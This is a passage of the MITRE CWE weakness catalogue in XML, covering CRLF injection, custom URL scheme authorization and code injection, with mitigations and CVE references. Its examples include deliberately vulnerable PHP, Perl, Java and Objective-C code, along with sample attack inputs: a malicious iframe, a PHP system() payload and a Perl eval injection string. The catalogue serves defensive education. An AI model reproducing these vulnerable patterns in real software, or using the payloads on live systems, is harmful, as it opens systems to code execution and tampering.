               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>Attackers can read sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Attackers can read sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
         </Common_Consequences>
         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data.</Note>
            <Note Type="Maintenance">This is a high-level node that includes children from various parts of the CWE research view (CWE-1000). Currently, most of the information is in these child entries. This entry will be made more comprehensive in later CWE versions.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="923" Name="Improper Restriction of Communication Channel to Intended Endpoints" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.</Description>
         <Extended_Description>
            <xhtml:p>Attackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.</xhtml:p>
            <xhtml:p>While this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint.</Note>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="501"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Maintenance">This entry will be made more comprehensive in later CWE versions.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="924" Name="Improper Enforcement of Message Integrity During Transmission in a Communication Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.</Description>
         <Extended_Description>A man-in-the-middle (MITM) attacker might be able to modify the message and spoof the endpoint.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint.</Note>
            </Consequence>
         </Common_Consequences>
         <Notes>
            <Note Type="Maintenance">This entry will be made more comprehensive in later CWE versions.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="93" Name="Improper Neutralization of CRLF Sequences ('CRLF Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="117" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid using CRLF as a special sequence.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Appropriately filter or quote CRLF sequences in user-controlled input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>logger.info("User's street address: " + request.getParameter("streetAddress"));</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1771</Reference>
               <Description>CRLF injection enables spam proxy (add mail headers) using email address or name.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1771</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1783</Reference>
               <Description>CRLF injection in API function arguments modify headers for outgoing requests.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1783</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1513</Reference>
               <Description>Spoofed entries in web server log file via carriage returns</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4624</Reference>
               <Description>Chain: inject fake log entries with fake timestamps using CRLF injection</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4624</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1951</Reference>
               <Description>Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1687</Reference>
               <Description>Chain: HTTP response splitting via CRLF in parameter related to URL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1687</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>CRLF Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>24</Entry_ID>
               <Entry_Name>HTTP Request Splitting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-928"/>
         </References>
         <Notes>
            <Note Type="Research Gap">Probably under-studied, although gaining more prominence in 2005 as a result of interest in HTTP response splitting.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="939" Name="Improper Authorization in Handler for Custom URL Scheme" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.</Description>
         <Extended_Description>Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Utilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.</xhtml:p>
                  <xhtml:p>When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string.</Intro_Text>
               <Body_Text>External Application</Body_Text>
               <Example_Code Nature="good" Language="Objective-C">
                  <xhtml:div>NSString *stringURL = @"appscheme://replaceFileText?file=incomingMessage.txt&amp;text=hello";<xhtml:br/>NSURL *url = [NSURL URLWithString:stringURL];<xhtml:br/>[[UIApplication sharedApplication] openURL:url];</xhtml:div>
               </Example_Code>
               <Body_Text>Application URL Handler</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>
                     <xhtml:br/>- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {<xhtml:div style="margin-left:10px;">if (!url) {<xhtml:div style="margin-left:10px;">return NO;</xhtml:div>}<xhtml:br/>NSString *action = [url host];<xhtml:br/>if([action isEqualToString: @"replaceFileText"]) {<xhtml:div style="margin-left:10px;">NSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];<xhtml:br/>
                           <xhtml:i>//this function will write contents to a specified file</xhtml:i>
                           <xhtml:br/>FileObject *objectFile = [self writeToFile:[dict objectForKey: @"file"] withText:[dict objectForKey: @"text"]];</xhtml:div>}<xhtml:br/>return YES;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari.</Body_Text>
               <Example_Code Nature="attack" Language="HTML">
                  <xhtml:div>&lt;iframe src="appscheme://replaceFileText?file=Bookmarks.dat&amp;text=listOfMaliciousWebsites"&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-109">
               <Intro_Text>These Android and iOS applications intercept URL loading and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>@Override<xhtml:br/>public boolean shouldOverrideUrlLoading(WebView view, String url){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){<xhtml:div style="margin-left:10px;">if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){<xhtml:div style="margin-left:10px;">writeDataToView(view, UserData);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:10px;">return true;</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Objective-C">
                  <xhtml:div>-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>NSURL *URL = [exRequest URL];<xhtml:br/>if ([[URL scheme] isEqualToString:@"exampleScheme"])<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                              <xhtml:div>NSString *functionString = [URL resourceSpecifier];<xhtml:br/>if ([functionString hasPrefix:@"specialFunction"])<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Make data available back in webview.</xhtml:i>
                                       <xhtml:br/>UIWebView *webView = [self writeDataToView:[URL query]];</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>return NO;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return YES;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>A call into native code can then be initiated by passing parameters within the URL:</Body_Text>
               <Example_Code Nature="attack" Language="JavaScript">
                  <xhtml:div>window.location = examplescheme://method?parameter=value</xhtml:div>
               </Example_Code>
               <Body_Text>Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2013-5725</Reference>
               <Description>URL scheme has action replace which requires no user prompt and allows remote attackers to perform undesired actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5725</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-5726</Reference>
               <Description>URL scheme has action follow and favorite which allows remote attackers to force user to perform undesired actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5726</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-938"/>
         </References>
         
      </Weakness>
      <Weakness ID="94" Name="Improper Control of Generation of Code ('Code Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.</Description>
         <Extended_Description>
            <xhtml:p>When software allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.</xhtml:p>
            <xhtml:p>Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Interpreted" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Refactor your program so that you do not have to dynamically generate code.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your software.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of code injection, use stringent whitelists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-32">
               <Intro_Text>This example attempts to write user messages to a message file and allow users to view them.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$MessageFile = "cwe-94/messages.out";<xhtml:br/>if ($_GET["action"] == "NewMessage") {<xhtml:div style="margin-left:10px;">$name = $_GET["name"];<xhtml:br/>$message = $_GET["message"];<xhtml:br/>$handle = fopen($MessageFile, "a+");<xhtml:br/>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");<xhtml:br/>fclose($handle);<xhtml:br/>echo "Message Saved!&lt;p&gt;\n";</xhtml:div>}<xhtml:br/>else if ($_GET["action"] == "ViewMessages") {<xhtml:div style="margin-left:10px;">include($MessageFile);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name=h4x0r<xhtml:br/>message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E</xhtml:div>
               </Example_Code>
               <Body_Text>which will decode to the following:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>&lt;?php system("/bin/ls -l");?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.</Body_Text>
               <Body_Text>Notice that XSS (CWE-79) is also possible in this situation.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-31">
               <Intro_Text>edit-config.pl: This CGI script is used to modify settings in a configuration file.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>
                     <xhtml:br/>sub config_file_add_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to add a field/key to a file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_set_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to set key to a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_delete_key {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to delete key from a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub handleConfigAction {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my ($fname, $action) = @_;<xhtml:br/>my $key = param('key');<xhtml:br/>my $val = param('val');<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># this is super-efficient code, especially if you have to invoke</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># any one of dozens of different functions!</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>my $code = "config_file_$action_key(\$fname, \$key, \$val);";<xhtml:br/>eval($code);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>$configfile = "/home/cwe/config.txt";<xhtml:br/>print header;<xhtml:br/>if (defined(param('action'))) {<xhtml:div style="margin-left:10px;">handleConfigAction($configfile, param('action'));</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">print "No action specified!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as: add_key(",","); system("/bin/ls"); This would produce the following string in handleConfigAction(): config_file_add_key(",","); system("/bin/ls"); Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-5071</Reference>
               <Description>Eval injection in PHP program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5071</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1750</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1750</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1752</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1753</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1527</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2837</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1921</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2498</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2498</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3302</Reference>
               <Description>Code injection into Python eval statement from a field in a formatted file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1253</Reference>
               <Description>Eval injection in Python program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1471</Reference>
               <Description>chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1471</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0495</Reference>
               <Description>Perl code directly injected into CGI library file from parameters to another CGI program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1876</Reference>
               <Description>Direct PHP code injection into supporting template file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1876</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1894</Reference>
               <Description>Direct code injection into PHP script that can be accessed by attacker.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0395</Reference>
               <Description>PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0395</Link>
            </Observed_Example>
         </Observed_Examples>
